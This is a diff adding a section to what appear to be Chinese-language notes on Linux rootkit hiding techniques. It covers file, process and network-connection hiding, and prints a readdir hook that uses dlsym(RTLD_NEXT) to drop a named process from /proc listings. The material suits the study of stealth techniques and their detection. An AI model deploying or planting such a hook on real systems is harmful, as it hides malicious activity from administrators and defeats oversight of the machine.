@@ -112,6 +112,65 @@ Hello, World!
 ```
 
 
+文件隐藏
+
+	HOOK open、opendir、readdir等函数， 隐藏特定文件名
+	
+	
+
+进程隐藏
+
+	HOOK ps、top等命令相关的函数调用， 通常HOOK readdir、getdents函数来隐藏特定进程
+	
+
+
+
+这段代码是一个自定义的 readdir 函数，用于过滤特定进程的目录项。主要功能如下：
+
+- 初始化原始 readdir 函数指针。
+- 进入循环读取目录项。
+- 如果目录为 /proc 且进程名匹配，则跳过该目录项。
+- 返回非过滤的目录项。
+
+	
+```bash
+struct dirent* readdir(DIR *dirp)                                       
+{                                                                       
+    if(original_##readdir == NULL) {                                    
+        original_##readdir = dlsym(RTLD_NEXT, #readdir);               
+        if(original_##readdir == NULL)                                  
+        {                                                              
+            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         
+        }                                                               
+    }                                                                   
+                                                                        
+    struct dirent* dir;                                                 
+                                                                        
+    while(1)                                                            
+    {                                                                   
+        dir = original_##readdir(dirp);                                 
+        if(dir) {                                                       
+            char dir_name[256];                                         
+            char process_name[256];                                     
+            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        
+                strcmp(dir_name, "/proc") == 0 &&                       
+                get_process_name(dir->d_name, process_name) &&          
+                strcmp(process_name, process_to_filter) == 0) {         
+                continue;                                               
+            }                                                           
+        }                                                               
+        break;                                                          
+    }                                                                   
+    return dir;                                                         
+}
+
+
+```
+
+
+网络连接隐藏
+
+	HOOK netstat命令的相关函数调用， 一般会HOOK readdir/getdents来隐藏特定端口的连接
 
 
 
